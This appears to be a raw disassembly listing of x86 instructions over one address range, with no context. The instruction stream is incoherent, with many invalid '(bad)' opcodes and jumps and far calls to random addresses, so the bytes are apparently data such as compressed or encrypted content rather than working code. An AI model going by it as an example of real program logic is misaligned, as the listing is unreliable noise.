  42ec52:	aaa    
  42ec53:	lods   al,BYTE PTR gs:[esi]
  42ec55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec56:	icebp  
  42ec57:	aad    0x64
  42ec59:	pop    ss
  42ec5a:	test   DWORD PTR [edi+0x146e4f9f],ecx
  42ec60:	mov    ecx,ecx
  42ec62:	mov    bh,0x7b
  42ec64:	rcl    BYTE PTR [eax+0x10],cl
  42ec67:	xchg   ebx,eax
  42ec68:	imul   ecx,DWORD PTR [ebx-0x2a],0x61
  42ec6c:	add    dl,BYTE PTR fs:[ebx]
  42ec6f:	fcom   QWORD PTR [ecx+0x34]
  42ec72:	ror    DWORD PTR [edi-0x77],0x33
  42ec76:	sti    
  42ec77:	sub    al,0xd2
  42ec79:	sbb    eax,0x35a5747
  42ec7e:	ins    BYTE PTR es:[edi],dx
  42ec7f:	inc    ecx
  42ec80:	inc    esp
  42ec81:	push   esp
  42ec82:	adc    eax,0xa0e06699
  42ec87:	pop    esi
  42ec88:	retf   
  42ec89:	ret    
  42ec8a:	pusha  
  42ec8b:	iret   
  42ec8c:	cdq    
  42ec8d:	jae    0x42ecd8
  42ec8f:	loope  0x42ec1e
  42ec91:	(bad)  
  42ec92:	jg     0x42ec5c
  42ec94:	pop    ds
  42ec95:	add    eax,DWORD PTR [eax+0x35]
  42ec98:	sbb    DWORD PTR [ecx],edx
  42ec9a:	mov    esp,0x7c00ea8e
  42ec9f:	adc    edi,ecx
  42eca1:	add    eax,0xebc9d42d
  42eca6:	adc    eax,0xe2022651
  42ecab:	xchg   DWORD PTR [esi+0x7d1837fd],edi
  42ecb1:	dec    ebp
  42ecb2:	jge    0x42ec9b
  42ecb4:	stos   BYTE PTR es:[edi],al
  42ecb5:	mov    eax,0x34a1d5b5
  42ecba:	adc    al,0xb2
  42ecbc:	add    ebp,DWORD PTR cs:[edx+0x7c]
  42ecc0:	dec    esi
  42ecc1:	(bad)  
  42ecc2:	(bad)  
  42ecc4:	and    al,0xe
  42ecc6:	fs inc ebp
  42ecc9:	and    BYTE PTR ds:0x55026a48,cl
  42eccf:	add    al,0x3
  42ecd1:	adc    BYTE PTR [edi-0x438a6d36],0xe5
  42ecd8:	mov    ebp,ecx
  42ecda:	pop    ds
  42ecdb:	ins    BYTE PTR es:[edi],dx
  42ecdc:	call   0x4a25:0xbdc5d216
  42ece3:	adc    eax,esi
  42ece5:	ins    DWORD PTR es:[edi],dx
  42ece6:	pop    ebx
  42ece7:	jmp    0x1350e5f5
  42ecec:	xor    al,0x79
  42ecee:	fiadd  WORD PTR [ecx+ebp*2+0x2]
  42ecf2:	inc    esp
  42ecf3:	fiadd  DWORD PTR [edi]
  42ecf5:	daa    
  42ecf6:	xchg   esp,eax
  42ecf7:	lahf   
  42ecf8:	sbb    eax,0x5d211f1f
  42ecfd:	loopne 0x42ed1a
  42ecff:	jl     0x42ece5
  42ed01:	inc    edx
  42ed02:	std    
  42ed03:	aad    0x86
  42ed05:	imul   DWORD PTR [edx-0x3dcdf067]
  42ed0b:	jmp    0x42ec96
  42ed0d:	push   ecx
  42ed0e:	mov    DWORD PTR [edi-0x2ccf61a],0x6d6e0344
  42ed18:	addr16 mov ds:0x7503,al
  42ed1c:	mov    ch,0xb0
  42ed1e:	dec    ebp
  42ed1f:	mov    ecx,0xc11f441e
  42ed24:	sahf   
  42ed25:	aaa    
  42ed26:	arpl   sp,sp
  42ed28:	mov    ecx,0xcd23203
  42ed2d:	(bad)  
  42ed2e:	in     eax,dx
  42ed2f:	jp     0x42ed9c
  42ed31:	ret    
  42ed32:	(bad)  
  42ed33:	mov    DWORD PTR [edi+0x4292c769],ecx
  42ed39:	adc    bl,cl
  42ed3b:	cmp    ch,BYTE PTR [eax]
  42ed3d:	ds mov ebx,0xcf069643
  42ed43:	stos   BYTE PTR es:[edi],al
  42ed44:	add    cl,BYTE PTR [edx-0x22]
  42ed47:	clc    
  42ed48:	add    edx,esp
  42ed4a:	mov    eax,0x6c1e183b
  42ed4f:	shl    DWORD PTR ds:0x4954a6ac,cl
  42ed55:	jbe    0x42ed9a
  42ed57:	fs mov esp,0x8fbe7405
  42ed5d:	test   al,0x95
  42ed5f:	call   0xe00a:0x55d0d242
  42ed66:	ins    DWORD PTR es:[edi],dx
  42ed67:	popf   
  42ed68:	mov    edi,0xe6d91b69
  42ed6d:	iret   
  42ed6e:	jg     0x42eda8
  42ed70:	(bad)  
  42ed71:	pusha  
  42ed72:	mov    al,0xd4
  42ed74:	push   edx
  42ed75:	xor    BYTE PTR [edi-0x2],bl
  42ed78:	dec    edi
  42ed79:	int    0x54
  42ed7b:	sbb    cl,BYTE PTR [ecx-0x334c0a83]
  42ed81:	icebp  
  42ed82:	adc    DWORD PTR [edx],ecx
  42ed84:	adc    eax,0x626889f3
  42ed89:	adc    bl,BYTE PTR [ebx-0x2b]
  42ed8c:	jae    0x42ed4a
  42ed8e:	call   0x4a99:0x1f93eff5
  42ed95:	sti    
  42ed96:	enter  0xc693,0xd4
  42ed9a:	jbe    0x42ed70
  42ed9c:	ins    DWORD PTR es:[edi],dx
  42ed9d:	jne    0x42ed9f
  42ed9f:	mov    ecx,0xee9e0631
  42eda4:	mov    DWORD PTR [edi],esp
  42eda6:	retf   
  42eda7:	cmp    eax,0x665aba90
  42edac:	test   DWORD PTR [edx+eiz*1-0x38],eax
  42edb0:	adc    eax,0xf0a71783
  42edb5:	bound  esp,QWORD PTR [edi-0x6087672]
  42edbb:	cwde   
  42edbc:	fmul   DWORD PTR [edi]
  42edbe:	retf   0x54d6
  42edc1:	sbb    al,0xce
  42edc3:	into   
  42edc4:	cmc    
  42edc5:	popa   
  42edc6:	stos   BYTE PTR es:[edi],al
  42edc7:	lahf   
  42edc8:	outs   dx,DWORD PTR ds:[esi]
  42edc9:	leave  
  42edca:	shl    BYTE PTR [esp+edx*8],0xa1
  42edce:	pop    ds
  42edcf:	jge    0x42ed63
  42edd1:	call   0xc1a8:0xf972386f
  42edd8:	pop    edx
  42edd9:	add    esi,edx
  42eddb:	aaa    
  42eddc:	adc    DWORD PTR [ebx+0x6e687365],ebp
  42ede2:	jnp    0x42ed8b
  42ede4:	aam    0x77
  42ede6:	or     al,0x94
  42ede8:	sbb    ebp,edx
  42edea:	push   ds
  42edeb:	int    0xa3
  42eded:	add    dl,BYTE PTR [esi+0x522bd5]
  42edf3:	rcl    eax,1
  42edf5:	adc    DWORD PTR [esi],ebx
  42edf7:	mov    ecx,0xb63761df
  42edfc:	mov    dl,0x87
  42edfe:	call   esp
  42ee00:	lahf   
  42ee01:	sbb    DWORD PTR [edi+0x19bcd239],ebx
  42ee07:	pop    es
  42ee08:	mov    cl,0x8d
  42ee0a:	jmp    0x42ed9a
  42ee0c:	mov    BYTE PTR [esi-0x1b],ah
  42ee0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee10:	nop
  42ee11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee12:	je     0x42ede9
  42ee14:	fldenv [ebp-0x6fa3a4d3]
  42ee1a:	xor    ch,BYTE PTR [edi+ecx*4]
  42ee1d:	scas   eax,DWORD PTR es:[edi]
  42ee1e:	jle    0x42ee73
  42ee20:	outs   dx,BYTE PTR ds:[esi]
  42ee21:	jmp    0xcc1f03be
  42ee26:	imul   edx,esi,0xffffffaa
  42ee29:	pop    ds
  42ee2a:	ins    DWORD PTR es:[edi],dx
  42ee2b:	pop    eax
  42ee2c:	nop
  42ee2d:	pop    esi
  42ee2e:	pop    ebx
  42ee2f:	adc    al,0x2c
  42ee31:	inc    esp
  42ee32:	push   ds
  42ee33:	push   ecx
  42ee34:	dec    esi
  42ee35:	jp     0x42ee46
  42ee37:	(bad)  
  42ee38:	fnsave [edx]
  42ee3a:	sbb    al,0xf1
  42ee3c:	jecxz  0x42ee43
  42ee3e:	push   0x1f
  42ee40:	into   
  42ee41:	imul   ebx,ebx,0xffffffca
  42ee44:	jne    0x42ee1d
  42ee46:	pusha  
  42ee47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee48:	dec    ebp
  42ee49:	cmp    ebx,edi
  42ee4b:	push   0x594b2d0f
  42ee50:	fbstp  TBYTE PTR [esi+0x1e]
  42ee53:	jns    0x42ee87
  42ee55:	shl    DWORD PTR ds:0x1e2e07fe,0x27
  42ee5c:	hlt    
  42ee5d:	std    
  42ee5e:	sub    eax,0xb058d348
  42ee63:	retf   0x2a7
  42ee66:	(bad)  
  42ee67:	aaa    
  42ee68:	jo     0x42eea7
  42ee6a:	mov    edx,gs
  42ee6c:	sahf   
  42ee6d:	inc    ecx
  42ee6e:	aaa    
  42ee6f:	xchg   ebp,eax
  42ee70:	mov    bh,cl
  42ee72:	mov    edi,0x6a9f856d
  42ee77:	mov    ebx,0xac7e2405
  42ee7c:	mov    dl,0x91
  42ee7e:	fbld   TBYTE PTR ds:0x917c776b
  42ee84:	mov    ch,cl
  42ee86:	push   ds
  42ee87:	cmp    ah,bh
  42ee89:	das    
  42ee8a:	div    DWORD PTR [eax+0x55]
  42ee8d:	jno    0x42eed7
  42ee8f:	popf   
  42ee90:	mov    BYTE PTR [ebp+ebx*2-0x41],ch
  42ee94:	push   es
  42ee95:	inc    esp
  42ee96:	dec    ebx
  42ee97:	add    ecx,DWORD PTR [ecx-0x130075b]
  42ee9d:	test   BYTE PTR [edx+0x30],dl
  42eea0:	pop    ebx
  42eea1:	sbb    al,0x0
  42eea3:	pop    ecx
  42eea4:	pushf  
  42eea5:	pop    ebx
  42eea6:	push   0x57
  42eea8:	mov    ah,BYTE PTR [edx+eiz*4]
  42eeab:	sbb    eax,0x271e38ab
  42eeb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eeb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eeb2:	pop    ss
  42eeb3:	call   0xe08d:0xd7764c74
  42eeba:	cli    
  42eebb:	and    al,0x43
  42eebd:	ror    BYTE PTR [ebp+0x15],cl
  42eec0:	sar    DWORD PTR [esi+0x1e],cl
  42eec3:	ins    DWORD PTR es:[edi],dx
  42eec4:	pop    es
  42eec5:	loope  0x42ee58
  42eec7:	(bad)
  42eecb:	stos   DWORD PTR es:[edi],eax
  42eecc:	lahf   
  42eecd:	pop    esp
  42eece:	lds    ecx,FWORD PTR [ebx]
  42eed0:	lock xchg esp,eax
  42eed2:	xchg   ecx,eax
  42eed3:	push   esp
  42eed4:	inc    esp
  42eed5:	test   eax,0x978be586
  42eeda:	and    eax,0x2db131e7
  42eedf:	nop
  42eee0:	push   cs
  42eee1:	or     eax,0x6d860714
  42eee6:	nop
  42eee7:	aam    0x28
  42eee9:	or     eax,0xc2a09949
  42eeee:	jno    0x42eef2
  42eef0:	mov    BYTE PTR [ebx+0x75e4ed32],bh
  42eef6:	idiv   BYTE PTR [esi+0x58]
  42eef9:	add    cl,ah
  42eefb:	sbb    edi,ebx
  42eefd:	shl    bh,0xef
  42ef00:	add    ebx,edi
  42ef02:	pop    ds
  42ef03:	sbb    eax,0x4bdfb34d
  42ef08:	or     al,0x40
  42ef0a:	inc    eax
  42ef0b:	aad    0x5e
  42ef0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef0e:	inc    edx
  42ef0f:	ds pop eax
  42ef11:	lods   eax,DWORD PTR ds:[esi]
  42ef12:	and    bl,cl
  42ef14:	push   0x848766be
  42ef19:	lea    edx,[ecx+0x7333985d]
  42ef1f:	inc    esp
  42ef20:	xor    cl,bl
  42ef22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef23:	aam    0xc9
  42ef25:	aas    
  42ef26:	pop    ss
  42ef27:	out    dx,eax
  42ef28:	push   esp
  42ef29:	add    al,0x49
  42ef2b:	push   esi
  42ef2c:	mov    bh,0x21
  42ef2e:	js     0x42eef5
  42ef30:	or     DWORD PTR [edi],ecx
  42ef32:	out    dx,eax
  42ef33:	jns    0x42ef7b
  42ef35:	arpl   dx,cx
  42ef37:	xlat   BYTE PTR ds:[ebx]
  42ef38:	mov    esp,0x9adfa803
  42ef3d:	cdq    
  42ef3e:	cld    
  42ef3f:	adc    eax,0x3b7c81fb
  42ef44:	out    0x7e,al
  42ef46:	adc    al,0xb8
  42ef48:	arpl   WORD PTR [ecx-0xd],ax
  42ef4b:	sbb    al,BYTE PTR [edi+0x2c]
  42ef4e:	push   es
  42ef4f:	xchg   ebp,eax
  42ef50:	cwde   
  42ef51:	add    eax,0xe816e956
  42ef56:	add    edi,DWORD PTR [edi]
  42ef58:	(bad)  
  42ef59:	enter  0xd7b8,0x6a
  42ef5d:	fild   DWORD PTR [ebp-0x15]
  42ef60:	mov    edi,esp
  42ef62:	js     0x42efd2
  42ef64:	jp     0x42ef78
  42ef66:	pushf  
  42ef67:	aam    0x76
  42ef69:	xor    cl,dl
  42ef6b:	xchg   ebp,eax
  42ef6c:	and    esp,DWORD PTR [eax+0x60]
  42ef6f:	clc    
  42ef70:	mov    BYTE PTR [ebx-0x5cfe3d4e],ah
  42ef76:	mov    DWORD PTR [eax],edx
  42ef78:	outs   dx,DWORD PTR ds:[esi]
  42ef79:	sbb    eax,0xb5bd98f6
  42ef7e:	and    eax,0xfdb4b94f
  42ef83:	retf   0x2c10
  42ef86:	xchg   ebp,eax
  42ef87:	aad    0xb3
  42ef89:	retf   
  42ef8a:	jb     0x42ef49
  42ef8c:	xchg   edi,eax
  42ef8d:	loope  0x42ef76
  42ef8f:	cmc    
  42ef90:	fadd   QWORD PTR [ebx]
  42ef92:	enter  0x19db,0xa5
  42ef96:	adc    BYTE PTR [eax+0x14aad2ae],dh
  42ef9c:	mov    edi,esp
  42ef9e:	dec    esp
  42ef9f:	sub    ah,0x42
  42efa2:	popa   
  42efa3:	lahf   
  42efa4:	fs adc al,0xc4
  42efa7:	sbb    eax,0x7586e16d
  42efac:	mov    DWORD PTR [esp+esi*4+0x18b7686a],ebx
  42efb3:	shr    ecx,1
  42efb5:	fs stos BYTE PTR es:[edi],al
  42efb7:	jnp    0x42f021
  42efb9:	mov    ebp,0xdc89155e
  42efbe:	push   ebx
  42efbf:	cmp    al,0xba
  42efc1:	out    0xc3,al
  42efc3:	(bad)  
  42efc4:	sbb    al,0x9
  42efc6:	and    al,0xdb
  42efc8:	pop    edx
  42efc9:	push   0x3d
  42efcb:	cmp    al,0x4b
  42efcd:	aam    0x60
  42efcf:	das    
  42efd0:	in     al,dx
  42efd1:	or     DWORD PTR [ebp+0x165b8f9a],esp
  42efd7:	inc    esp
  42efd8:	dec    edi
  42efd9:	or     al,0x60
  42efdb:	and    DWORD PTR [ebx+ebp*4-0x54],0x5b0d56f4
  42efe3:	push   ecx
  42efe4:	sti    
  42efe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efe6:	in     eax,0x9
  42efe8:	jb     0x42f036
  42efea:	mov    ecx,0x63ad34f4
  42efef:	aam    0x16
  42eff1:	shl    DWORD PTR [esi-0x5eaf2ae2],1
  42eff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eff8:	mov    DWORD PTR [ebx],ebp
  42effa:	xchg   edx,eax
  42effb:	xor    eax,0x7f74349f
  42f000:	xchg   DWORD PTR [edx],eax
  42f002:	repnz out dx,eax
  42f004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f005:	outs   dx,DWORD PTR ds:[esi]
  42f006:	hlt    
  42f007:	inc    edi
  42f008:	fld    DWORD PTR [ecx+0x3dc6611f]
  42f00e:	push   ecx
  42f00f:	out    dx,eax
  42f010:	test   al,0x9
  42f012:	or     al,0xd7
  42f014:	inc    ebp
  42f015:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42f017:	pop    ecx
  42f018:	sub    al,BYTE PTR [eax+0x3188451d]
  42f01e:	mov    cl,0x6f
  42f020:	jecxz  0x42f032
  42f022:	nop
  42f023:	jmp    0x8b7f:0x1498152f
  42f02a:	pop    edi
  42f02b:	aam    0x87
  42f02d:	jge    0x42f079
  42f02f:	aad    0x89
  42f031:	retf   
  42f032:	aas    
  42f033:	not    dh
  42f035:	scas   al,BYTE PTR es:[edi]
  42f036:	jbe    0x42f08f
  42f038:	cmp    BYTE PTR [edx],al
  42f03a:	data16 fnstsw WORD PTR [edx]
  42f03d:	sbb    eax,0x4aa22750
  42f042:	pop    edx
  42f043:	xchg   ebx,eax
  42f044:	xlat   BYTE PTR ds:[ebx]
  42f045:	push   edi
  42f046:	jmp    0x645e74d2
  42f04b:	nop
  42f04c:	cdq    
  42f04d:	imul   eax,DWORD PTR gs:[eax],0xd388494e
  42f054:	rol    BYTE PTR [edx],cl
  42f056:	pop    es
  42f057:	mov    cl,0x2
  42f059:	test   DWORD PTR [ebp-0x71b6767f],edx
  42f05f:	popf   
  42f060:	push   edx
  42f061:	sahf   
  42f062:	xor    BYTE PTR [ebp-0x71],bh
  42f065:	add    eax,0x5c49ddb4
  42f06a:	jnp    0x42f054
  42f06c:	popa   
  42f06d:	mov    bl,0x5d
  42f06f:	adc    edi,DWORD PTR [edx-0x9c91205]
  42f075:	adc    edx,esi
  42f077:	lods   al,BYTE PTR ds:[esi]
  42f078:	pop    eax
  42f079:	add    cl,BYTE PTR [edi+eiz*2]
  42f07c:	xchg   edi,ebp
  42f07e:	cli    
  42f07f:	(bad)  
  42f080:	icebp  
  42f081:	add    DWORD PTR [edi],ebx
  42f083:	loope  0x42f0e5
  42f085:	xchg   ebx,eax
  42f086:	aaa    
  42f087:	ins    BYTE PTR es:[edi],dx
  42f088:	or     eax,0x985c8981
  42f08d:	shl    BYTE PTR [ecx+0x66],0xba
  42f091:	push   0xc2c803ff
  42f096:	push   ss
  42f097:	push   esp
  42f098:	dec    esp
  42f099:	mov    edi,0x41f77290
  42f09e:	mov    bh,0xd5
  42f0a0:	push   ss
  42f0a1:	iret   
  42f0a2:	in     al,dx
  42f0a3:	out    0x70,al
  42f0a5:	jne    0x42f113
  42f0a7:	aam    0x3e
  42f0a9:	push   ebx
  42f0aa:	inc    edx
  42f0ab:	mov    BYTE PTR [edx-0x7093eefd],bl
  42f0b1:	jno    0x42f07b
  42f0b3:	ror    BYTE PTR [edx-0x40],1
  42f0b6:	in     al,dx
  42f0b7:	adc    eax,0xd4292764
  42f0bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0bd:	xlat   BYTE PTR ds:[ebx]
  42f0be:	mov    ch,0x5c
  42f0c0:	xlat   BYTE PTR ds:[ebx]
  42f0c1:	pusha  
  42f0c2:	push   esi
  42f0c3:	push   DWORD PTR [ebp-0x10]
  42f0c6:	pusha  
  42f0c7:	and    esp,DWORD PTR [ecx]
  42f0c9:	jp     0x42f0fd
  42f0cb:	pop    edx
  42f0cc:	add    al,BYTE PTR [ebp-0x61]
  42f0cf:	aam    0xd
  42f0d1:	fadd   QWORD PTR [esi+0x5fbc0ebc]
  42f0d7:	dec    ebp
  42f0d8:	mov    ah,0xbb
  42f0da:	lea    ebp,[ebx+0x9]
  42f0dd:	(bad)  
  42f0de:	(bad)  
  42f0df:	rcr    DWORD PTR [esp+eax*8-0x4c],cl
  42f0e3:	shr    DWORD PTR [esi+0x679b53ae],1
  42f0e9:	jl     0x42f089
  42f0eb:	and    eax,0x5a19e4a9
  42f0f0:	xchg   DWORD PTR [ebx+0x4a174311],ebp
  42f0f6:	sahf   
  42f0f7:	cmp    BYTE PTR [edx-0x152b2df9],0x98
  42f0fe:	jno    0x42f162
  42f100:	xchg   BYTE PTR [edx-0x2d],dh
  42f103:	fwait
  42f104:	jo     0x42f0a5
  42f106:	pop    ds
  42f107:	das    
  42f108:	mov    BYTE PTR [ecx+ebx*4],dh
  42f10b:	inc    ecx
  42f10c:	jg     0x42f0a4
  42f10e:	cmp    DWORD PTR [edi+0x4d],esi
  42f111:	gs out 0x39,al
  42f114:	retf   
  42f115:	sub    bl,BYTE PTR [esi]
  42f117:	xchg   ecx,eax
  42f118:	ja     0x42f17f
  42f11a:	test   eax,0x20ef2880
  42f11f:	mov    edx,0x5b28705d
  42f124:	enter  0xc267,0xc6
  42f128:	adc    bh,bh
  42f12a:	pusha  
  42f12b:	cmp    DWORD PTR [eax+0x2a],edx
  42f12e:	xchg   esi,eax
  42f12f:	sbb    eax,0xab6176d6
  42f134:	jo     0x42f17f
  42f136:	std    
  42f137:	add    cl,BYTE PTR [esp+ebx*2+0x6168a18e]
  42f13e:	loope  0x42f102
  42f140:	sahf   
  42f141:	xor    DWORD PTR [edx+ecx*2-0x3acfdcc],esi
  42f148:	pop    edx
  42f149:	xor    ah,ah
  42f14b:	shl    BYTE PTR [esi-0x5c36871d],cl
  42f151:	dec    esi
  42f152:	scas   eax,DWORD PTR es:[edi]
  42f153:	loop   0x42f11e
  42f155:	cmc    
  42f156:	pop    ds
  42f157:	xchg   ebp,eax
  42f158:	mov    cl,0x27
  42f15a:	or     cl,BYTE PTR [eax-0xa]
  42f15d:	hlt    
  42f15e:	not    dh
  42f160:	test   BYTE PTR [edx],dh
  42f162:	mov    ecx,0xd2062197
  42f167:	cmc    
  42f168:	add    eax,0xba631e20
  42f16d:	jmp    0x42f12c
  42f16f:	inc    edx
  42f170:	ja     0x42f17e
  42f172:	mov    al,0x5c
  42f174:	cli    
  42f175:	mov    ch,0x60
  42f177:	pop    ebp
  42f178:	aas    
  42f179:	cdq    
  42f17a:	stos   DWORD PTR es:[edi],eax
  42f17b:	ret    0xf12b
  42f17e:	ins    DWORD PTR es:[edi],dx
  42f17f:	icebp  
  42f180:	or     al,0x31
  42f182:	push   ecx
  42f183:	pop    ebx
  42f184:	test   eax,0x92161ed1
  42f189:	and    eax,0x7001d1ed
  42f18e:	and    al,0xe6
  42f190:	in     eax,0xef
  42f192:	and    BYTE PTR [edi-0x469f03ab],dh
  42f198:	xchg   dl,al
  42f19a:	rcl    edi,1
  42f19c:	mov    dh,0x9e
  42f19e:	push   eax
  42f19f:	inc    ebp
  42f1a0:	outs   dx,BYTE PTR ds:[esi]
  42f1a1:	loope  0x42f152
  42f1a3:	aad    0x60
  42f1a5:	adc    edi,ecx
  42f1a7:	imul   ecx,DWORD PTR [esi-0x16],0xd8ffb82
  42f1ae:	dec    ebx
  42f1af:	repnz and al,0x44
  42f1b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f1b3:	jne    0x42f1ad
  42f1b5:	jb     0x42f18f
  42f1b7:	aad    0xe7
  42f1b9:	test   BYTE PTR [edi+0x51],ah
  42f1bc:	add    DWORD PTR [eax-0x7],0x29
  42f1c0:	sahf   
  42f1c1:	or     DWORD PTR [edx],0x5e
  42f1c4:	jp     0x42f1c9
  42f1c6:	mov    WORD PTR [edx-0x2a6c6554],gs
  42f1cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1cd:	pop    ebp
  42f1ce:	stos   DWORD PTR es:[edi],eax
  42f1cf:	inc    ebp
  42f1d0:	outs   dx,BYTE PTR ds:[esi]
  42f1d1:	mov    edx,DWORD PTR [eax]
  42f1d3:	hlt    
  42f1d4:	mov    edi,DWORD PTR [ecx]
  42f1d6:	adc    eax,0x986f0141
  42f1db:	jg     0x42f205
  42f1dd:	mov    cl,0x5f
  42f1df:	aam    0xff
  42f1e1:	sbb    al,0x45
  42f1e3:	dec    eax
  42f1e4:	test   edi,edx
  42f1e6:	stos   BYTE PTR es:[edi],al
  42f1e7:	scas   eax,DWORD PTR es:[edi]
  42f1e8:	aad    0x89
  42f1ea:	cmp    DWORD PTR [eax+0x54da2d97],ebx
  42f1f0:	shl    esi,0xf
  42f1f3:	or     ah,dh
  42f1f5:	add    eax,0xf00fee40
  42f1fa:	or     edi,ebx
  42f1fc:	fwait
  42f1fd:	cs pop ds
  42f1ff:	jns    0x42f22b
  42f201:	icebp  
  42f202:	fs ja  0x42f1b1
  42f205:	inc    ebx
  42f206:	mov    bh,dl
  42f208:	or     dl,bh
  42f20a:	push   edi
  42f20b:	sub    bh,ah
  42f20d:	not    DWORD PTR [edx+0x57]
  42f210:	inc    ecx
  42f211:	jecxz  0x42f27b
  42f213:	sub    eax,0xb2c8cb89
  42f218:	mov    edx,0x52b5d6d4
  42f21d:	add    bl,BYTE PTR [edx+0x0]
  42f220:	data16 adc cl,al
  42f223:	mov    ebp,0xd91f3831
  42f228:	popa   
  42f229:	outs   dx,DWORD PTR ds:[esi]
  42f22a:	mov    al,0xed
  42f22c:	retf   0xcf2f
  42f22f:	enter  0x14f0,0x18
  42f233:	inc    ebp
  42f234:	mov    edx,0x44f7e8f6
  42f239:	loop   0x42f294
  42f23b:	aas    
  42f23c:	out    0x65,al
  42f23e:	dec    esi
  42f23f:	or     BYTE PTR [eax+0x5f50b9fb],0x7a
  42f246:	xor    esi,DWORD PTR [edx+0x32c648ad]
  42f24c:	push   cs
  42f24d:	xor    BYTE PTR [ebx-0x12e40cef],0x77
  42f254:	mov    BYTE PTR [edi],dh
  42f256:	pop    eax
  42f257:	das    
  42f258:	fistp  WORD PTR [ebp+0x30]
  42f25b:	cmp    al,0x48
  42f25d:	xor    edi,DWORD PTR [eax-0x36]
  42f260:	lock scas al,BYTE PTR es:[edi]
  42f262:	or     BYTE PTR [esi+esi*8-0x4b478e11],cl
  42f269:	adc    al,0xb5
  42f26b:	shl    BYTE PTR [esi+0x2ee4337e],cl
  42f271:	pop    esp
  42f272:	dec    edx
  42f273:	aad    0x9f
  42f275:	hlt    
  42f276:	out    0xa4,al
  42f278:	inc    esp
  42f279:	sbb    DWORD PTR [eax],0xfccd8948
  42f27f:	sbb    eax,0x587fd442
  42f284:	enter  0x3b06,0xd7
  42f288:	pop    esp
  42f289:	push   esi
  42f28a:	(bad)  
  42f28b:	outs   dx,BYTE PTR ds:[esi]
  42f28c:	sti    
  42f28d:	jmp    0x42f2da
  42f28f:	or     ecx,DWORD PTR [eax+0xa90bfb1]
  42f295:	mov    eax,0x22ab5b0
  42f29a:	call   0xb757018b
  42f29f:	ins    BYTE PTR es:[edi],dx
  42f2a0:	push   ebp
  42f2a1:	ss fs sub ecx,edi
  42f2a5:	jno    0x42f2a5
  42f2a7:	mov    ah,0x38
  42f2a9:	and    edi,DWORD PTR [ebx+0xe]
  42f2ac:	and    eax,0xf1abfc01
  42f2b1:	sbb    eax,0xba3b9a9a
  42f2b6:	inc    edx
  42f2b7:	and    cl,BYTE PTR [ecx-0x6b69687f]
  42f2bd:	daa    
  42f2be:	or     bl,BYTE PTR fs:0x161d9e02
  42f2c5:	cld    
  42f2c6:	jmp    0x42f2d6
  42f2c8:	mov    ch,0xb8
  42f2ca:	pop    ds
  42f2cb:	and    ebx,edx
  42f2cd:	cmp    bl,BYTE PTR fs:[ebx+0x74]
  42f2d1:	sub    esp,DWORD PTR [ecx+0x3fe763bb]
  42f2d7:	add    BYTE PTR [eax+edx*4],dl
  42f2da:	mov    al,ds:0x661c05c2
  42f2df:	mov    WORD PTR [eax-0x2bb9c10b],cs
  42f2e5:	adc    esp,DWORD PTR [eax-0x57]
  42f2e8:	push   ebx
  42f2e9:	mov    esi,DWORD PTR [ebp+0x31]
  42f2ec:	xchg   esp,eax
  42f2ed:	xor    BYTE PTR [ebp+0xf7f4852],0x68
  42f2f4:	int    0x57
  42f2f6:	pop    ds
  42f2f7:	or     edi,edx
  42f2f9:	inc    edi
  42f2fa:	fidivr WORD PTR [esi-0x2e]
  42f2fd:	hlt    
  42f2fe:	lock aad 0x93
  42f301:	sub    eax,0x725c9014
  42f306:	inc    edi
  42f307:	lds    edx,FWORD PTR [edi+0x62deea6d]
  42f30d:	add    DWORD PTR [ebp*4-0x2bc4c8c4],0x29
  42f315:	add    DWORD PTR [ebx-0x52],ebx
  42f318:	jnp    0x42f36c
  42f31a:	xor    al,dl
  42f31c:	mov    BYTE PTR [ebx-0x28e7e805],dl
  42f322:	call   0xc4:0x7e14e8f3
  42f329:	shl    BYTE PTR [eax-0x2c],cl
  42f32c:	sub    eax,0x8601ab4d
  42f331:	and    DWORD PTR [edx+0x60b6c9a1],eax
  42f337:	push   ebx
  42f338:	mov    al,ds:0xf2d6a521
  42f33d:	or     eax,0x1a885c94
  42f342:	shl    ebp,cl
  42f344:	cmc    
  42f345:	outs   dx,BYTE PTR ds:[esi]
  42f346:	push   ds
  42f347:	adc    eax,0x53f9fb5e
  42f34c:	fisubr DWORD PTR [ecx+0x30]
  42f34f:	aam    0xa3
  42f351:	sub    BYTE PTR [edi],dh
  42f353:	xchg   ebp,eax
  42f354:	jae    0x42f3af
  42f356:	inc    eax
  42f357:	mov    ds:0x331f0d75,al
  42f35c:	adc    al,0x46
  42f35e:	adc    BYTE PTR [esi+eax*1+0x3ba1aed0],0x29
  42f366:	xchg   ecx,eax
  42f367:	ins    DWORD PTR es:[edi],dx
  42f368:	add    BYTE PTR [edx],0x84
  42f36b:	stos   DWORD PTR es:[edi],eax
  42f36c:	mov    ecx,0x88879bcc
  42f371:	imul   edx,edi,0xd226aaba
  42f377:	ja     0x42f3c3
  42f379:	add    edi,DWORD PTR [edx+0x12]
  42f37c:	std    
  42f37d:	leave  
  42f37e:	xchg   edi,ecx
  42f380:	lds    ebx,FWORD PTR [edi+ebx*1-0x6ad565fb]
  42f387:	dec    edi
  42f388:	fiadd  WORD PTR [edx-0x19a2b0d]
  42f38e:	push   ebx
  42f38f:	cdq    
  42f390:	enter  0xc777,0xdd
  42f394:	(bad)
  42f398:	fnstsw WORD PTR [edx-0x47]
  42f39b:	xchg   esp,eax
  42f39c:	mov    dh,0x9d
  42f39e:	sub    ah,dl
  42f3a0:	cli    
  42f3a1:	ret    0xe305
  42f3a4:	loopne 0x42f341
  42f3a6:	loope  0x42f3ad
  42f3a8:	mov    DWORD PTR ds:0xa827e152,esp
